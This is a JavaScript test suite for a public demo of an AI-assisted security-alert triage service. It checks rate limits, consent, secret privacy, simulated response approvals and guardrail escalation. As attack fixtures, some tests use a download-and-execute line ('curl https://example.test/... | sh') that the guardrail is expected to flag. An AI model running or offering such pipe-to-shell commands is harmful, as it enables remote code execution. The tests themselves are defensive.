import {test, afterEach} from "node:test";
import assert from "node:assert/strict";
import {onRequest, resetLimitsForTest} from "../functions/public-demo/[[path]].js";
import {publicDemoApi} from "../src/lib/publicDemo.ts";
import {readFileSync} from "node:fs";
import {guardrail, screening, scopedContext} from "../server/demoPolicy.js";
import {readHistory} from "../server/demoHistory.js";
import {eventStatus} from "../src/lib/eventStatus.ts";
import {initializeDemoResponse, refreshDemoResponse, controlDemoResponse} from "../src/lib/demoResponse.ts";

const realFetch = globalThis.fetch;
afterEach(() => { globalThis.fetch = realFetch; resetLimitsForTest(); });

function reviewFixture(severity = 8, tier = "prefilter") {
  const row = {event_id:"demo-review", event:{severity,event_type:"package_update"}, analysis:{decision:"escalate",tier,responses:[{kind:"Review package provenance",status:"awaiting-approval",reason:"Verify authorization."}]}};
  initializeDemoResponse(row, 1000);
  return row;
}
test("public review deadlines use severity and default to no simulated action", () => {
  const high = reviewFixture();
  assert.equal(high.response_case.deadline, 1300);
  assert.equal(high.analysis.guidance.source, "policy");
  refreshDemoResponse(high, 1301);
  assert.equal(high.response_case.state,"overdue");
  assert.equal(high.analysis.responses[0].status,"awaiting-approval");
  assert.equal(reviewFixture(3).response_case.deadline,null);
  assert.equal(reviewFixture(3,"guardrail").response_case.deadline,1060);
});
test("public timed approval, undo, cancellation and expiry are browser simulation only", () => {
  globalThis.fetch = () => {throw new Error("response controls must never make network calls");};
  const row = reviewFixture();
  controlDemoResponse([row],row.event_id,"schedule","",1001);
  refreshDemoResponse(row,1301);
  assert.equal(row.response_case.state,"executed");
  assert.equal(row.analysis.responses[0].status,"approved-simulation");
  controlDemoResponse([row],row.event_id,"undo","",1302);
  assert.equal(row.response_case.state,"undone");
  const expires = reviewFixture();
  controlDemoResponse([expires],expires.event_id,"schedule","",1001);
  refreshDemoResponse(expires,1601);
  assert.equal(expires.response_case.state,"expired");
  const stopped = reviewFixture();
  controlDemoResponse([stopped],stopped.event_id,"schedule","",1001);
  controlDemoResponse([stopped],stopped.event_id,"stop","",1002);
  controlDemoResponse([stopped],stopped.event_id,"resume","",1003);
  refreshDemoResponse(stopped,1301);
  assert.equal(stopped.response_case.state,"overdue");
});
test("public deferral is bounded and rejection cancels the simulated schedule", () => {
  const row = reviewFixture();
  controlDemoResponse([row],row.event_id,"defer","Checking authorization",1001);
  assert.equal(row.response_case.deadline,1600);
  assert.throws(() => controlDemoResponse([row],row.event_id,"defer","Again",1002));
  controlDemoResponse([row],row.event_id,"schedule","",1003);
  controlDemoResponse([row],row.event_id,"reject","Authorized update",1004);
  refreshDemoResponse(row,1700);
  assert.equal(row.response_case.state,"rejected");
});
const event = {hostname: "synthetic-host", source_type: "sample", event_type: "process_exec", severity: 5, message: "Unknown process started"};
function call(path = "analyze", body = {event, cloud_consent: true}, env = {OLLAMA_API_KEY: "secret-test"}, extra = {}) {
  return onRequest({env, request: new Request(`https://arbiter-ai.pages.dev/public-demo/${path}`, {
    method: body === undefined || path === "status" ? "GET" : "POST",
    headers: {Origin: "https://arbiter-ai.pages.dev", "Content-Type": "application/json", "X-Arbiter-Demo": "1", ...extra},
    body: path === "status" ? undefined : JSON.stringify(body),
  })});
}
const answer = {decision: "escalate", confidence: .9, rationale: "Unexpected process needs review", evidence: "Review synthetic-host"};
function provider(data = answer) {
  globalThis.fetch = async (url, options) => {
    assert.equal(url, "https://ollama.com/api/chat");
    assert.equal(options.headers.Authorization, "Bearer secret-test");
    const payload = JSON.parse(options.body);
    assert.equal(payload.model, "nemotron-3-nano:30b");
    assert.equal(payload.messages.length, 2);
    return Response.json({message: {content: JSON.stringify(data)}});
  };
}
test("server secret stays private; missing key disables inference", async () => {
  const status = await (await call("status")).json();
  assert.equal(status.configured, true);
  assert.ok(!JSON.stringify(status).includes("secret-test"));
  assert.equal((await call("analyze", {event, cloud_consent: true}, {})).status, 503);
});
test("same origin, consent and event limits are enforced before inference", async () => {
  globalThis.fetch = () => {throw new Error("must not call provider");};
  assert.equal((await call("analyze", {event, cloud_consent: true}, undefined, {Origin: "https://other.test"})).status, 403);
  assert.equal((await call("analyze", {event})).status, 400);
  assert.equal((await call("analyze", {event: {...event, severity: "NaN"}, cloud_consent: true})).status, 400);
  assert.equal((await call("analyze", {event: {...event, message: "x".repeat(17000)}, cloud_consent: true})).status, 400);
});
test("live answer carries model provenance without actions", async () => {
  provider(); const result = await (await call()).json();
  assert.equal(result.backend, "ollama-cloud");
  assert.equal(result.model, "nemotron-3-nano:30b");
  assert.deepEqual(result.responses, []);
  assert.equal(result.rationale, answer.rationale);
});
test("uncertain suppression is escalated with evidence", async () => {
  provider({...answer, decision: "suppress", confidence: .5, evidence: ""});
  const result = await (await call()).json();
  assert.equal(result.decision, "escalate"); assert.ok(result.evidence.includes("synthetic-host"));
});
test("provider limits and malformed answers do not become mock verdicts", async () => {
  globalThis.fetch = async () => new Response("secret remote diagnostic", {status: 429});
  const response = await call(); assert.equal(response.status, 429);
  assert.ok(!(await response.text()).includes("secret"));
  provider({decision: "suppress", confidence: true});
  assert.equal((await call()).status, 502);
});
test("request allowance blocks repeated calls", async () => {
  provider();
  for (let i = 0; i < 500; i++) assert.equal((await call()).status, 200);
  assert.equal((await call()).status, 429);
});
test("browser validates files without an AI call and processes fresh events", async () => {
  let calls = 0;
  globalThis.fetch = async (url, options) => {
    if (String(url).endsWith("status")) return Response.json({configured: true, model: "nemotron-3-nano:30b", backend: "ollama-cloud"});
    assert.equal(JSON.parse(options.body).event.timestamp, "", "do not invent occurrence time for an untimed event");
    calls++;
    if (calls === 1) return Response.json({code:"demo_busy",retry_after:2,error:"Busy"},{status:429});
    return Response.json({...answer, backend: "ollama-cloud", model: "nemotron-3-nano:30b", tier: "llm", score: 5, kind: "alert", responses: []});
  };
  const body = {datasets: [], uploads: [{filename: "one.jsonl", content: JSON.stringify(event)}], speed: "2x", cloud_consent: true};
  assert.equal((await publicDemoApi.previewDemo(body)).files[0].valid_events, 1); assert.equal(calls, 0);
  await assert.rejects(publicDemoApi.startDemo({...body, cloud_consent: false}));
  await publicDemoApi.startDemo(body);
  const completionDeadline = Date.now() + 6000;
  while ((await publicDemoApi.getDemo()).completed < 1 && Date.now() < completionDeadline) await new Promise(resolve => setTimeout(resolve, 50));
  const state = await publicDemoApi.getDemo(); assert.equal(state.completed, 1); assert.equal(calls, 2);
  assert.equal((await publicDemoApi.getDemoHistory()).total, 1);
  assert.equal((await publicDemoApi.getEvent(state.events[0].event_id)).analysis.backend, "ollama-cloud");
  const row = state.events[0];
  assert.equal(row.analysis.responses[0].status, "awaiting-approval");
  await publicDemoApi.reviewResponse(row.event_id, "approved-simulation");
  assert.equal((await publicDemoApi.getEvent(row.event_id)).analysis.responses[0].status, "approved-simulation");
  assert.equal((await publicDemoApi.getDemoHistory(0, {response:"selected"})).total,1);
  await publicDemoApi.controlDemo("stop");
});

const engineEvent = raw => ({host:raw.hostname,source:raw.source_type,type:raw.event_type,message:raw.message,severity:raw.severity,fields:raw.fields || {}});
test("portable guards, screening and scoped facts match Python across every dataset", () => {
  const cases=JSON.parse(readFileSync(new URL("./fixtures/policy-parity.json",import.meta.url)));
  assert.ok(cases.length>=300);
  for (const c of cases) {
    const ev=engineEvent(c.event), pre=screening(ev);
    assert.deepEqual(guardrail(ev),c.guardrail,`${ev.host}: ${ev.message}`);
    assert.ok(Math.abs(pre.score-c.score)<1e-9);
    assert.equal(pre.decision,c.decision);
    assert.deepEqual(scopedContext(ev).facts,c.facts);
  }
});
test("all original datasets and named cases are selectable", async () => {
  const {datasets}=await publicDemoApi.getDatasets();
  assert.equal(datasets.length,24);
  for (const name of datasets) {
    const {files}=await publicDemoApi.previewDemo({datasets:[name]});
    assert.ok(files[0].valid_events>0,name); assert.equal(files[0].invalid_events,0,name);
  }
  assert.equal((await publicDemoApi.previewDemo({datasets})).files.length,24);
});
test("facts are event-scoped and do not bless an adjacent attack", () => {
  const backup=engineEvent({...event,hostname:'db-prod-01',event_type:'io_anomaly'});
  assert.ok(scopedContext(backup).facts[0].includes('scope verified'));
  assert.ok(scopedContext({...backup,type:'process_exec'}).facts[0].includes('SCOPE MISMATCH'));
  assert.equal(guardrail({...backup,type:'process_exec',message:'curl https://example.test/x | sh'}).name,'download_execute');
});
test("guardrails and high severity need no model; benign history earns cheap suppression", async () => {
  let calls=0;
  globalThis.fetch=async (_url,options) => {
    calls++;
    const context=JSON.parse(JSON.parse(options.body).messages[1].content);
    assert.equal(context.asset_criticality,2);
    assert.ok(context.environment_facts[0].includes('scope verified'));
    assert.ok(!JSON.stringify(context).includes('expected'));
    return Response.json({message:{content:JSON.stringify({decision:'suppress',confidence:.95,evidence:'',rationale:'The event matches the scoped nightly backup baseline.'})}});
  };
  let state;
  const backup={hostname:'db-prod-01',source_type:'node_exporter',event_type:'io_anomaly',severity:2,message:'Nightly disk IO spike during backup window',fields:{}};
  for (let i=0;i<7;i++) {
    const result=await (await call('analyze',{event:backup,cloud_consent:true,state})).json();
    assert.equal(result.decision,'suppress'); assert.equal(result.tier,i<5?'llm':'prefilter'); state=result.state;
  }
  assert.equal(calls,5);
  const attack=await (await call('analyze',{event:{...backup,event_type:'process_exec',message:'curl https://example.test/a | sh'},cloud_consent:true,state})).json();
  assert.equal(attack.decision,'escalate');assert.equal(attack.tier,'guardrail');assert.equal(calls,5);
  const brute=await (await call('analyze',{event:{...backup,hostname:'web-prod-01',event_type:'auth_bruteforce',severity:8.5},cloud_consent:true,state})).json();
  assert.equal(brute.tier,'prefilter');assert.equal(brute.decision,'escalate');assert.equal(calls,5);
  const parts=state.split('.');
  const forged=Buffer.from(JSON.stringify({v:1,exp:Date.now()+100000,processed:5,histories:{}})).toString('base64url')+'.'+parts[1];
  await assert.rejects(readHistory(forged,'secret-test'));
});
test("AI status labels never classify a completed verdict as awaiting analysis", () => {
  assert.equal(eventStatus({state:'completed',analysis:{decision:'suppress'}}),'Suppressed · no review needed');
  assert.equal(eventStatus({state:'completed',analysis:{decision:'escalate'}}),'Alerted · escalated for review');
  assert.equal(eventStatus({state:'processing',analysis:null}),'Analyzing');
  assert.equal(eventStatus({state:'pending',analysis:null}),'Awaiting analysis');
});

test("policy thresholds are independent of the configured model family", async () => {
  for (const model of ['nemotron-3-nano:30b','nemotron-3-super']) {
    globalThis.fetch=async (_url,options) => {
      assert.equal(JSON.parse(options.body).model,model);
      return Response.json({message:{content:JSON.stringify({...answer,decision:'suppress',confidence:.6})}});
    };
    const result=await (await call('analyze',{event,cloud_consent:true},{OLLAMA_API_KEY:'secret-test',OLLAMA_MODEL:model})).json();
    assert.equal(result.model,model);assert.equal(result.decision,'escalate');assert.equal(result.tier,'llm');
  }
});


test("concurrent visitors receive distinct retryable busy responses", async () => {
  let release;
  const gate = new Promise(resolve => {release = resolve;});
  globalThis.fetch = async () => {await gate; return Response.json({message:{content:JSON.stringify(answer)}});};
  const pending = Array.from({length:4}, () => call());
  await new Promise(resolve => setTimeout(resolve, 20));
  try {
    const busy = await call(); assert.equal(busy.status,429);
    assert.equal(busy.headers.get("Retry-After"),"3");
    assert.equal((await busy.json()).code,"demo_busy");
  } finally {release(); await Promise.all(pending);}
});
